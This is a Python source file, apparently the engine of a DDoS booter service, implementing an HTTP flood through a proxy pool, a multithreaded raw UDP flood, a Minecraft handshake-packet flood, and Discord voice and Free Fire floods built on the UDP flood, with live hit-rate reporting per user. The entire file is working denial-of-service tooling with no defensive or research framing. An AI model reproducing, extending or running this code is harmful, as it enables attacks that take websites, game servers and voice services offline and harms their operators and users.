# attack_engine.py
import asyncio
import aiohttp
import socket
import random
import os
import time
from pathlib import Path
from config import PROXY_FILE


class AttackEngine:
    def __init__(self):
        self.proxies: list[str] = []
        self._load_proxies()
        self.running_users: dict[int, dict] = {}

    def _load_proxies(self):
        p = Path(PROXY_FILE)
        if not p.exists():
            # fallback: proxys in base dir
            p = Path("proxy.txt")
        if p.exists():
            self.proxies = [
                l.strip() for l in p.read_text(errors="ignore").splitlines()
                if l.strip() and ":" in l
            ]
        print(f"[ENGINE] loaded {len(self.proxies)} proxies")

    def is_running(self, user_id: int) -> bool:
        return user_id in self.running_users

    def any_running(self) -> bool:
        return bool(self.running_users)

    # ─────────────────────────────────────────
    # L7 — HTTP flood via proxy pool
    # ─────────────────────────────────────────
    async def _l7_worker(self, session, target, proxy, stop_at, stats):
        while time.time() < stop_at:
            try:
                async with session.get(
                    target, proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=5),
                    ssl=False,
                    allow_redirects=False,
                ) as r:
                    await r.read()
                    stats["hits"] += 1
            except Exception:
                stats["errors"] += 1
            await asyncio.sleep(0)

    async def attack_l7(self, target: str, duration: int,
                        on_tick=None) -> dict:
        stop_at = time.time() + duration
        stats = {"hits": 0, "errors": 0}

        connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
        timeout = aiohttp.ClientTimeout(total=5)

        tasks = []
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            for i, proxy in enumerate(self.proxies):
                tasks.append(asyncio.create_task(
                    self._l7_worker(s, target, proxy, stop_at, stats)
                ))
                if i % 50 == 0:
                    await asyncio.sleep(0)

            # tick loop
            last = time.time()
            while time.time() < stop_at:
                await asyncio.sleep(1)
                if on_tick:
                    elapsed = time.time() - last
                    speed = stats["hits"] / max(1, elapsed)
                    await on_tick(
                        time_left=max(0, int(stop_at - time.time())),
                        hits=stats["hits"],
                        speed=f"{speed:.0f} req/s",
                    )
                    last = time.time()

            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        return stats

    # ─────────────────────────────────────────
    # L4 — UDP flood (direct socket)
    # ─────────────────────────────────────────
    def _l4_thread(self, host, port, stop_at, stats, payload_size=1400):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except Exception:
            pass
        payload = random._urandom(payload_size)
        target = (host, port)
        while time.time() < stop_at:
            try:
                sock.sendto(payload, target)
                stats["hits"] += 1
            except Exception:
                stats["errors"] += 1
        try:
            sock.close()
        except Exception:
            pass

    async def attack_l4(self, host: str, port: int, duration: int,
                        threads: int = 200, on_tick=None) -> dict:
        import threading
        stop_at = time.time() + duration
        stats = {"hits": 0, "errors": 0}

        workers = []
        for _ in range(threads):
            t = threading.Thread(
                target=self._l4_thread,
                args=(host, port, stop_at, stats),
                daemon=True,
            )
            t.start()
            workers.append(t)

        last = time.time()
        while time.time() < stop_at:
            await asyncio.sleep(1)
            if on_tick:
                elapsed = time.time() - last
                speed = stats["hits"] / max(1, elapsed)
                await on_tick(
                    time_left=max(0, int(stop_at - time.time())),
                    hits=stats["hits"],
                    speed=f"{speed:.0f} pkt/s",
                )
                last = time.time()

        return stats

    # ─────────────────────────────────────────
    # Minecraft — UDP handshake flood
    # ─────────────────────────────────────────
    def _mc_packet(self) -> bytes:
        # minimal Minecraft handshake packet
        host = b"localhost"
        pkt_id = b"\x00"
        proto = b"\x04"  # protocol version byte (varint simplified)
        port = b"\x63\xdd"  # 25565
        next_state = b"\x01"
        body = pkt_id + proto + bytes([len(host)]) + host + port + next_state
        return bytes([len(body)]) + body

    async def attack_minecraft(self, host: str, port: int, duration: int,
                               threads: int = 200, on_tick=None) -> dict:
        import threading
        stop_at = time.time() + duration
        stats = {"hits": 0, "errors": 0}
        pkt = self._mc_packet()

        def _run():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
            except Exception:
                pass
            while time.time() < stop_at:
                try:
                    sock.sendto(pkt, (host, port))
                    stats["hits"] += 1
                except Exception:
                    stats["errors"] += 1
            try: sock.close()
            except Exception: pass

        workers = [threading.Thread(target=_run, daemon=True) for _ in range(threads)]
        for t in workers: t.start()

        last = time.time()
        while time.time() < stop_at:
            await asyncio.sleep(1)
            if on_tick:
                elapsed = time.time() - last
                speed = stats["hits"] / max(1, elapsed)
                await on_tick(
                    time_left=max(0, int(stop_at - time.time())),
                    hits=stats["hits"],
                    speed=f"{speed:.0f} pkt/s",
                )
                last = time.time()
        return stats

    # ─────────────────────────────────────────
    # Discord — UDP voice flood
    # ─────────────────────────────────────────
    async def attack_discord(self, host: str, port: int, duration: int,
                             threads: int = 200, on_tick=None) -> dict:
        return await self.attack_l4(host, port, duration, threads, on_tick)

    # ─────────────────────────────────────────
    # Free Fire — UDP flood
    # ─────────────────────────────────────────
    async def attack_freefire(self, host: str, port: int, duration: int,
                              threads: int = 200, on_tick=None) -> dict:
        return await self.attack_l4(host, port, duration, threads, on_tick)

    # ─────────────────────────────────────────
    # measure ping
    # ─────────────────────────────────────────
    async def measure_speed(self, target: str, port: int) -> str:
        if target.startswith("http"):
            url = target
        else:
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{target}:{port}"
        try:
            start = time.time()
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                    await r.read()
            ms = int((time.time() - start) * 1000)
            return f"{ms}ms"
        except Exception:
            return "offline"